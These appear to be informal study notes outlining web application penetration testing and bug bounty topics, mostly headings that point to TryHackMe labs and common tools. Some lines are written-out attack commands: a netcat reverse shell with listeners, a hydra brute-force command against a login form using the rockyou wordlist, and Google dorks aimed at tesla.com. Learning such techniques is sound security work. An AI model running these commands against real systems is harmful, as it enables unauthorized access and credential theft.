# Web APP Penetration Testing (Bug Bounty)

Web application penetration testing is a security assessment performed on a web application to identify
vulnerabilities and weaknesses that could be exploited by attackers. It involves simulating real-world
attacks to uncover potential security flaws.

Bug bounty programs, on the other hand, are initiatives offered by organizations to incentivize security
researchers and ethical hackers to find and report vulnerabilities in their web applications.
These programs provide rewards or bounties to individuals who discover and responsibly disclose
security issues.

### dirb tool

- run metaspoit vm
- open the ip of it
- dirb

### burpsuite tool

- shellshock exploitation
- command injection
- nc -lvp 5555
- i nc -e /bin/bash (ip) 5555
- meterpreter shell
- msfvenom
- xss and cookie stealing
- sql injection
- csrf vulnerability
- hydra brute force attack
- burpsuite intruder

### enumeration and information gathering

- nmap, nikto, dirb, burpsuit
- google dorks
- site:sesla.com filetype:pdf
- "@tesla.com" -site:tesla.com
- ping, host, nslookup
- whois tesla.com
- whatweb (target ip)
- dirb http://targetip
- nmap --script vuln (ip)
- nikto -host (ip)

### burpsuite

- configuration -> install burpsuite certificate
- burpsuite intercept -> not forward if not open -> proxy tab
- burpsuite repeater
- burpsuite intruder

### html injection

visit try hack me

- setup openvpn configuration

### monetizing bug hunting

- practice as much as needed
- bug bounty program participation
- read terms and conditions carefully
- website: hackerone.com, bugcrowd.com, cobalt.io, synack.com, intigriti.com

### command injection execution

- system command directly
- wireshark
- php reverse shell
- search phc one time reverse shell
- nc -lvp 1234

### broken authentication

- session hijacking, session fixation, session management
- run openvpn
- go to try hack me -> web app hacking -> broken authentication task 6/7
- broken authentication via cookies
- http request

### bruteforce attack

- using burpsuite intruder
- switch to cluster bomb
- hydra
- hydra (target ip) http-post-form "/login:username=^USER^&password=^PASS^:invalid" -l user.txt -P /usr/share/wordlists/rockyou.txt
- hydra ssh attack

### sensitive data exposure

- page source code
- crackstation.net -> to crack hash

### broken access control (idor)

- try hack me -> web app hacking -> broken access control task 17/18

### security misconfiguration

- pefall psswd -> tomcat(php)

### xss - cross site scripting

- injecting js code
- changing page content
- bypass filter
- download file
- dom xss

### sql injection

- unfiltered input

### xml, xpath, xxe injection

### components with known vulnerabilities

### insufficient logging and monitoring
